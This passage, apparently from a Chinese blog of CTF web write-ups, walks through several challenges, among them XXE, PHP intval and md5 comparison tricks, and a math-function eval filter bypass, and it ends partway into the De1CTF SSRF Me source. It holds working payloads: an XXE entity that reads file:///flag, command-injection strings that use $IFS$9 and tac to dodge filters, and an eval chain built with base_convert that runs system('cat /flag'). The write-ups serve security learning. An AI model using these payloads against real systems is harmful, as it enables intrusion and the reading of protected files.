class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">var</span> msg = result.getElementsByTagName(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).text(msg + <span class="string">&quot; login fail!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).text(msg + <span class="string">&quot; login success!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).text(<span class="string">&quot;error:&quot;</span> + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="built_in">error</span>: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">&quot;.msg&quot;</span>).text(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注册信息会被传输到doLogin.php，打开此url然后抓包</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">penson</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;penson;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>penson<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ct f中flag文件一般在根目录下或者/var/www/html/</p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p><a href="https://xz.aliyun.com/t/6887#toc-5">从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com)</a></p>
<h1 id="ASIS-2019-Unicorn-shop1"><a href="#ASIS-2019-Unicorn-shop1" class="headerlink" title="[ASIS 2019]Unicorn shop1"></a>[ASIS 2019]Unicorn shop1</h1><h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>  <a href="https://www.compart.com/en/unicode/U+10130">“𐄰” U+10130 Aegean Number Sixty Thousand Unicode Character (compart.com)</a></p>
<p>查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;&lt;!--Ah,really important,seriously. --&gt;</span><br></pre></td></tr></table></figure>

<p>提示utf-8很重要</p>
<p>“金钱从来不会让人快乐，也不会，它的本质中没有任何东西可以产生幸福。一个人拥有的越多，人们想要的就越多。</p>
<p>提示钱可能出了问题，测才买最后一个，并且钱要大一些，输入thousand,找一个大一些的，然后把0x改为%</p>
<p>对于非ASCII字符，需要使用ASCII字符集的超集进行编码得到相应的字节，然后对每个字节执行百分号编码。对于Unicode字符，RFC文档建议使用utf-8对其进行编码得到相应的字节，然后对每个字节执行百分号编码。如”中文”使用UTF-8字符集得到的字节为0xE4 0xB8 0xAD 0xE6 0x96 0x87，经过Url编码之后得到”%E4%B8%AD%E6%96%87”。</p>
<h1 id="WUSTCTF2020-朴实无华1"><a href="#WUSTCTF2020-朴实无华1" class="headerlink" title="[WUSTCTF2020]朴实无华1"></a>[WUSTCTF2020]朴实无华1</h1><h2 id="intval-md5-md5-md5-ls–-gt-dir-cat–-gt-tac"><a href="#intval-md5-md5-md5-ls–-gt-dir-cat–-gt-tac" class="headerlink" title="intval   $md5==md5($md5)     ls–&gt;dir   cat–&gt;tac"></a>intval   $md5==md5($md5)     ls–&gt;dir   cat–&gt;tac</h2><p>用dirsearch扫描，得到robots.txt文件，打开看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fAke_f1agggg.php</span><br></pre></td></tr></table></figure>

<p>打开这个文件，出现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;this_is_not_flag&#125;</span><br></pre></td></tr></table></figure>

<p>是一个假的flag，没有别的方法了，抓包发包，然后看到了提示文件，打开之后得到了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;蹇埌闈炴床浜�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">鍘婚潪娲插惂</span><br></pre></td></tr></table></figure>

<p> $num = $_GET[‘num’];</p>
<p>if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)</p>
<p> 令num=1e10,’1e10’=1   ‘1e10+1’&gt;2021</p>
<p>*<em>intval</em>获取数据的整数值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;+42&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;-42&#x27;</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;042&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;1e10&#x27;</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;420000000000000000000&#x27;</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> $md5==md5($md5)  0e215962017</p>
<p>$IFS$9代替空格</p>
<p><a href="http://101.200.53.102:23333/fl4g.php?num=2e4&amp;md5=0e215962017&amp;get_flag=ls">http://101.200.53.102:23333/fl4g.php?num=2e4&amp;md5=0e215962017&amp;get_flag=ls</a></p>
<p>cat被过滤了，用tac代替</p>
<h1 id="CISCN-2019-初赛-Love-Math1"><a href="#CISCN-2019-初赛-Love-Math1" class="headerlink" title="[CISCN 2019 初赛]Love Math1"></a>[CISCN 2019 初赛]Love Math1</h1><h2 id="c-GETa-amp-a-system-amp-b-cat-flag"><a href="#c-GETa-amp-a-system-amp-b-cat-flag" class="headerlink" title="?c=$_GETa&amp;a=system&amp;b=cat flag"></a>?c=$_GET<a href="$_GET%5Bb%5D">a</a>&amp;a=system&amp;b=cat flag</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数<br>例如：$function = “sayHello”;$function();</p>
<p>scandir() 函数：返回指定目录中的文件和目录的数组。<br>base_convert() 函数：在任意进制之间转换数字。<br>dechex() 函数：把十进制转换为十六进制。<br>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。<br>var_dump() ：函数用于输出变量的相关信息。<br>readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。<br>语法：readfile(filename,include_path,context)</p>
<p>这道题的核心就是base_convert构造hex2bin函数</p>
<p>我们先来写下我们要构造的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>中括号被禁用我们可以用花括号代替{}，要构造的字符串为 _GET,php中有将16进制转成字符串的函数hex2bin，那么hex2bin又怎么生成呢，这时就需要我们的base_convert函数了，36进制也就是base36中有字母数字正好可以满足。<br>所以 base_convert(37907361743,10,36)=hex2bin。因为我们是要得到_GET所以就得用到另外一个函数dechex将_GET的10进制转为16进制再通过hex2bin转换为字符串<br>所以_GET=base_convert(37907361743,10,36)(dechex(1598506324));<br>好了我们已经可以构造出$_GET[]了，那么直接将上面的payload修改下即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>[(45条消息) <a href="https://blog.csdn.net/weixin_45577185/article/details/120208258">CISCN 2019 初赛]Love Math 1_满月*的博客-CSDN博客</a></p>
<h1 id="De1CTF-2019-SSRF-Me1"><a href="#De1CTF-2019-SSRF-Me1" class="headerlink" title="[De1CTF 2019]SSRF Me1"></a>[De1CTF 2019]SSRF Me1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span>  <span class="comment"># python得构造方法</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span>  <span class="comment"># 定义的命令执行函数，此处调用了scan这个自定义的函数</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == self.sign</span></span><br><span class="line">            <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># action要写scan</span></span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)  <span class="comment"># 此处是文件读取得注入点</span></span><br><span class="line">                <span class="comment"># resp = urllib.urlopen(param).read()</span></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp  <span class="comment"># 输出结果</span></span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># action要加read</span></span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):  <span class="comment"># !!!校验</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment"># md5(secert_key + param + action).hexdigest()</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># !!!这个路由用于测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + action).hexdigest()</span></span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># 这个路由是我萌得最终注入点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)  </span><span class="comment"># 根目录路由，就是显示源代码得地方</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span>  <span class="comment"># 这是用来扫目录得函数</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span>  <span class="comment"># !!!这个应该是本题关键点,此处注意顺序先是param后是action</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span>  <span class="comment"># 这个waf比较没用好像</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>要想获得flag,需要找到action,param,sign的参数值</p>
<p><strong>getSign(self.action, self.param) == self.sign</strong>  可以获得sign的值</p>
